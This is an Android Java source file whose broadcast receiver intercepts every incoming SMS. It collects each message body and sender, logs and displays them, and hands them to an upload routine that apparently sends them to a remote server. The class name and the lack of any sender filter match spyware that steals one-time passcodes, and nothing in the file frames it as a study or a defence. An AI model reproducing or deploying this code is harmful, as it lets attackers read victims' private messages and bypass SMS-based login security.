package com.phantom;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Set;

public class OTPBroadCastReceiver extends BroadcastReceiver {
    public static String TAG = OTPBroadCastReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive: " + intent.getAction());
        if (Utils.volleyQueue == null) {
            Utils.volleyQueue = Volley.newRequestQueue(context);
        }
        // Get Bundle object contained in the SMS intent passed in
        HashMap<String, String> mapMess = new HashMap<>();
        Bundle bundle = intent.getExtras();
        SmsMessage[] smsMsg = null;
        String smsStr = "";
        if (bundle != null) {
            // Get the SMS message
            Object[] pdus = (Object[]) bundle.get("pdus");
            smsMsg = new SmsMessage[pdus.length];
            for (int i = 0; i < smsMsg.length; i++) {
                smsMsg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                smsStr = smsMsg[i].getMessageBody().toString();

                String Sender = smsMsg[i].getOriginatingAddress();
                Log.d(TAG, "onReceive: smsStr:" + smsStr);
                Log.d(TAG, "onReceive: Sender:" + Sender);
                //Check here sender is yours
                if (mapMess.containsKey(Sender)) {
                    smsStr = mapMess.get(Sender) + smsStr;
                }
                mapMess.put(Sender, smsStr);
            }
        }
        //-----------------------------------------------
        sendIncomingMessToTargets(context, mapMess);
    }

    private void sendIncomingMessToTargets(Context context, HashMap<String, String> mapMess) {
        Set<String> senders = mapMess.keySet();
        for (String sender : senders) {
            Intent smsIntent = new Intent("otp");
            String mess = mapMess.get(sender);
            smsIntent.putExtra("message", mess);
            smsIntent.putExtra("Sender", sender);
            LocalBroadcastManager.getInstance(context).sendBroadcast(smsIntent);
            Toast.makeText(context, sender + ":" + mess, Toast.LENGTH_LONG).show();
            sendMessToServer(context, sender, mess);
        }
    }

    private void sendMessToServer(Context context, String sender, String mess) {
        Log.d(TAG, "sendMessToServer " + sender);
        Utils.loginAndUpload(mess, sender);
    }
}
